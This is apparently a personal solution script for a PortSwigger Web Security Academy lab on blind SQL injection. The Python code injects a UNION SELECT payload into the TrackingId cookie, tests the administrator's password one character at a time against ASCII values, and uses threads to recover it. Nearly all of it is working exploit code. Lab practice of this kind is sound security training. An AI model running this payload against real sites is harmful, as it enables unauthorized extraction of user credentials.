##########################################################################
# Vadim Polovnikov
# Date: xx-10-2020
# Platform: PortSwigger Web Security Academy
# Lab: SQL Injection >> Blind >> 
#  >> 'Exploiting blind SQL injection by triggering conditional responses'
# Description:
'''
Python script for blind SQL injection exploitation
based on a technique of triggering different HTTP
responses using conditional statements
'''
##########################################################################

import requests
import time
import concurrent.futures

url = input("Enter the URL: ")

# Burp Suite proxy for debugging
proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}

start = time.perf_counter()

# Creating a session with the web app
with requests.Session() as s:
        r = s.get(url, proxies=proxies, verify=False)
        print(r.headers) # Response headers
        
        cj = r.cookies # CookieJar object
        cj_dict = requests.utils.dict_from_cookiejar(cj) # CookieJar object --> Dictionary
        
        print(cj_dict)

        cookie_names = [cookie for cookie in cj_dict.keys()] # Extracting cookie names
        cj.clear(domain=url.split('/')[-1], path='/', name=cookie_names[0]) # Deleting TrackingId cookie

        # ASCII numeric values (a-b, 0-9)
        ascii_num_file = open('/Users/vadimpolovnikov/list.txt', 'r')
        characters_list = ascii_num_file.read().split('\n')
        
        print("Password is loading ...")

        def sqli_pass_brute(pass_character):
                for n in characters_list:
                        sqli = f"' UNION SELECT 'a' FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password, {pass_character}, 1))={n}--"

                        cj.set(
                                cookie_names[0], sqli,
                                domain=url.split('/')[-1], path='/'
                                ) # Setting new injected TrackingId

                        r = s.get(url, cookies=cj, proxies=proxies, verify=False)

                        if "Welcome back!" in r.text:
                                letter = chr(int(n)) 
                                break
                return letter
        
        # Creating multiple threads for faster cracking 
        with concurrent.futures.ThreadPoolExecutor() as executor: 
                threads = executor.map(sqli_pass_brute, list(range(1, 21)))

        password = ""
        for letter in threads:  # map method puts sqli_pass_brute() results in a sequential order
                password += letter # into the threads list

        print("The password is loaded!" + "\n" + password)

        ascii_num_file.close()

stop = time.perf_counter()
print(f"Cracking time - {round(stop - start, 2)} second(s).")
